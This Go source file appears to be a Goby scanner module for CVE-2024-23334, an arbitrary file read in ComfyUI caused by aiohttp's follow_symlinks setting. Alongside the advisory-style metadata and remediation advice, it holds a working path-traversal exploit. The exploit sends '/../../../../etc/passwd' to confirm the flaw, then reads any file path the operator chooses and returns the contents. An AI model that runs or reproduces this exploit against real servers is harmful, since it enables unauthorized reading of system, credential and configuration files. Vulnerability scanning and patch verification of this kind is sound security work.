package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"regexp"
	"strings"
)

func init() {
	expJson := `{
    "Name": "ComfyUI follow_symlinks File Read Vulnerability (CVE-2024-23334)",
    "Description": "<p>ComfyUI is a powerful, modular stable diffusion GUI, API, and backend. It provides a graphical/node interface for designing and managing stable diffusion pipelines.</p><p>ComfyUI uses a low version of aiohttp as a web server and configures static routes with the follow_symlinks option enabled, leading to an arbitrary file read vulnerability. The vulnerability allows an attacker to read leaked source code, database configuration files, etc., resulting in a highly insecure web site.</p>",
    "Product": "ComfyUI",
    "Homepage": "https://github.com/comfyanonymous/ComfyUI/",
    "DisclosureDate": "2024-01-29",
    "PostTime": "2024-02-29",
    "Author": "liuweifeng@baimaohui.net",
    "FofaQuery": "title=\"ComfyUI\"",
    "GobyQuery": "title=\"ComfyUI\"",
    "Level": "2",
    "Impact": "<p>ComfyUI uses a lower version of the aiohttp component as the web server and configures static routing with the follow_symlinks option enabled, resulting in an arbitrary file reading vulnerability. Attackers can use this vulnerability to read leaked source code, database configuration files, etc., causing the website to be in an extremely unsafe state.</p>",
    "Recommendation": "<p>1. Disable the follow_symlinks=True option in server.py.</p><p>2. Use a reverse proxy server (e.g. nginx) for static resources.</p><p>3. If not necessary, keep the system off the public web.</p>",
    "References": [
        "https://github.com/aio-libs/aiohttp/security/advisories/GHSA-5h86-8mv2-jq9f",
        "https://mp.weixin.qq.com/s/L7-OX7Bib6QTj-KrhaE9IA"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "custom",
            "show": ""
        },
        {
            "name": "filePath",
            "type": "input",
            "value": "/../../../../../../../../../etc/passwd",
            "show": "attackType=custom"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": []
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "File Read"
    ],
    "VulType": [
        "File Read"
    ],
    "CVEIDs": [
        "CVE-2024-23334"
    ],
    "CNNVD": [
        "CNNVD-202401-2541"
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "7.5",
    "Translation": {
        "CN": {
            "Name": "ComfyUI follow_symlinks 文件读取漏洞（CVE-2024-23334）",
            "Product": "ComfyUI",
            "Description": "<p>ComfyUI 是一个功能强大的模块化的稳定扩散 GUI、API 和后端。它提供了一个图形/节点界面，用于设计和管理稳定扩散管道。</p><p>ComfyUI 使用低版本的 aiohttp 组件作为 Web 服务器并配置静态路由，启用了 follow_symlinks 选项，导致存在任意文件读取漏洞。攻击者可通过该漏洞读取泄露源码、数据库配置⽂件等等，导致⽹站处于极度不安全状态。</p>",
            "Recommendation": "<p>1、在 server.py 中禁用 follow_symlinks=True 选项。<br></p><p>2、使用反向代理服务器（例如nginx）处理静态资源。</p><p>3、如⾮必要，禁⽌公⽹访问该系统。</p>",
            "Impact": "<p>ComfyUI 使用低版本的 aiohttp 组件作为 Web 服务器并配置静态路由，启用了 follow_symlinks 选项，导致存在任意文件读取漏洞。攻击者可通过该漏洞读取泄露源码、数据库配置⽂件等等，导致⽹站处于极度不安全状态。<br></p>",
            "VulType": [
                "文件读取"
            ],
            "Tags": [
                "文件读取"
            ]
        },
        "EN": {
            "Name": "ComfyUI follow_symlinks File Read Vulnerability (CVE-2024-23334)",
            "Product": "ComfyUI",
            "Description": "<p>ComfyUI is a powerful, modular stable diffusion GUI, API, and backend. It provides a graphical/node interface for designing and managing stable diffusion pipelines.<br></p><p>ComfyUI uses a low version of aiohttp as a web server and configures static routes with the follow_symlinks option enabled, leading to an arbitrary file read vulnerability. The vulnerability allows an attacker to read leaked source code, database configuration files, etc., resulting in a highly insecure web site.<br></p>",
            "Recommendation": "<p>1. Disable the follow_symlinks=True option in server.py.</p><p>2. Use a reverse proxy server (e.g. nginx) for static resources.</p><p>3. If not necessary, keep the system off the public web.</p>",
            "Impact": "<p>ComfyUI uses a lower version of the aiohttp component as the web server and configures static routing with the follow_symlinks option enabled, resulting in an arbitrary file reading vulnerability. Attackers can use this vulnerability to read leaked source code, database configuration files, etc., causing the website to be in an extremely unsafe state.<br></p>",
            "VulType": [
                "File Read"
            ],
            "Tags": [
                "File Read"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10929"
}`
	readFileFlagFidBm4 := func(hostInfo *httpclient.FixUrl, filePath string) (*httpclient.HttpResponse, error) {
		if !strings.HasPrefix(filePath, `/`) {
			filePath = `/` + filePath
		}
		readFileRequestConfig := httpclient.NewGetRequestConfig(filePath)
		readFileRequestConfig.FollowRedirect = false
		readFileRequestConfig.VerifyTls = false
		return httpclient.DoHttpRequest(hostInfo, readFileRequestConfig)
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostinfo *httpclient.FixUrl, stepLogs *scanconfig.SingleScanConfig) bool {
			resp, _ := readFileFlagFidBm4(hostinfo, `/../../../../../../../../../etc/passwd`)
			success := resp != nil && len(regexp.MustCompile(`[\w-]+:[^:]+:\d+:\d+:[^:]*:[^:]+:[^:]+`).FindAllString(resp.Utf8Html, -1)) > 1
			if success {
				stepLogs.VulURL = hostinfo.FixedHostInfo + resp.Request.URL.Path
			}
			return success
		},
		func(expResult *jsonvul.ExploitResult, stepLogs *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			attackType := goutils.B2S(stepLogs.Params["attackType"])
			if attackType == "custom" {
				if resp, err := readFileFlagFidBm4(expResult.HostInfo, goutils.B2S(stepLogs.Params["filePath"])); resp.StatusCode == 200 && len(resp.RawBody) > 0 {
					expResult.Success = true
					expResult.Output = resp.RawBody
				} else if err != nil {
					expResult.Output = err.Error()
				}
			} else {
				expResult.Output = `未知的利用方式`
			}
			return expResult
		},
	))
}
